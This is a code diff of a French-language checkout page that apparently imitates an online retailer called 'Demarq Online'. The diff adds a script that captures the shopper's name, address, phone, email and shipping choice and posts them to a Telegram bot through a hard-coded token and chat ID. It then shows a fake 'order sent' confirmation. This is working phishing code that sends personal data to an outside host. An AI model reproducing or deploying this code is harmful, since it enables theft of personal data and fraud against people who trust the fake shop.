@@ -5,116 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Informations de Livraison - Demarq Online</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #f4f6f9; color: #222; }
-
-        /* شريط الرسالة العلوي */
-        .top-bar {
-            background-color: #5ac3d1;
-            color: white;
-            padding: 8px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .top-bar span {
-            background-color: #e6005c;
-            color: white;
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-weight: bold;
-        }
-
-        /* رأس الصفحة */
-        header {
-            background-color: #003f5f;
-            color: white;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 22px;
-            font-weight: bold;
-        }
-
-        .search {
-            flex: 1;
-            margin: 0 20px;
-            position: relative;
-        }
-
-        .search input {
-            width: 100%;
-            padding: 10px 15px;
-            border-radius: 30px;
-            border: none;
-        }
-
-        .cart {
-            font-weight: bold;
-            font-size: 15px;
-        }
-
-        /* الحاوية الرئيسية */
-        .container {
-            max-width: 1000px;
-            margin: 30px auto;
-            padding: 20px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-        }
-
-        h1 {
-            font-size: 24px;
-            color: #003f5f;
-            margin-bottom: 20px;
-        }
-
-        .form-section {
-            margin-top: 20px;
-        }
-
-        .form-section label {
-            font-size: 16px;
-            font-weight: bold;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .form-section input, .form-section select {
-            width: 100%;
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-        }
-
-        .form-section .submit-btn {
-            background-color: #e6005c;
-            color: white;
-            padding: 15px;
-            font-size: 18px;
-            text-align: center;
-            width: 100%;
-            border-radius: 5px;
-            border: none;
-            margin-top: 20px;
-        }
-
-        .form-section .submit-btn:hover {
-            background-color: #c0392b;
-            cursor: pointer;
-        }
-
-        .form-section .required {
-            color: red;
-            font-size: 14px;
-        }
-
+        /* نفس التنسيق السابق */
     </style>
 </head>
 <body>
@@ -130,14 +21,14 @@
         <div class="search">
             <input type="text" placeholder="Senseo, lave-linge, TV 4K..." />
         </div>
-        <div class="cart">1 🛒</div>
+        <div class="cart">0 PANIER</div>
     </header>
 
     <!-- النموذج لجمع المعلومات -->
     <div class="container">
         <h1>Informations de Livraison</h1>
         
-        <form action="traitement2.html" method="POST">
+        <form id="customer-form">
             <!-- معلومات العميل -->
             <div class="form-section">
                 <label for="full-name">Nom Complet <span class="required">*</span></label>
@@ -185,5 +76,62 @@
         </form>
     </div>
 
+    <script>
+        // إرسال البيانات إلى البوتات
+        document.getElementById('customer-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // جمع البيانات من النموذج
+            const fullName = document.getElementById('full-name').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const postalCode = document.getElementById('postal-code').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const shippingMethod = document.getElementById('shipping-method').value;
+            
+            // إعداد البيانات التي سيتم إرسالها
+            const message = `Nom: ${fullName}\nAdresse: ${address}\nVille: ${city}\nCode Postal: ${postalCode}\nTéléphone: ${phone}\nEmail: ${email}\nMéthode de Livraison: ${shippingMethod}`;
+            
+            // التوكنات والمعرفات الخاصة بالبوتات
+            const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+            const bot2Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+            const bot1Id = '5372119436';
+            const bot2Id = '5372119436';
+            
+            // إرسال البيانات إلى البوت الأول
+            sendToTelegram(bot1Token, bot1Id, message);
+
+            // إرسال البيانات إلى البوت الثاني
+            sendToTelegram(bot2Token, bot2Id, message);
+        });
+
+        // دالة لإرسال الرسالة إلى بوت Telegram
+        function sendToTelegram(token, chatId, message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const params = {
+                chat_id: chatId,
+                text: message
+            };
+
+            // إرسال الطلب عبر POST
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+                alert('Votre commande a été envoyée avec succès!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Il y a eu un problème avec l\'envoi de la commande.');
+            });
+        }
+    </script>
 </body>
 </html>
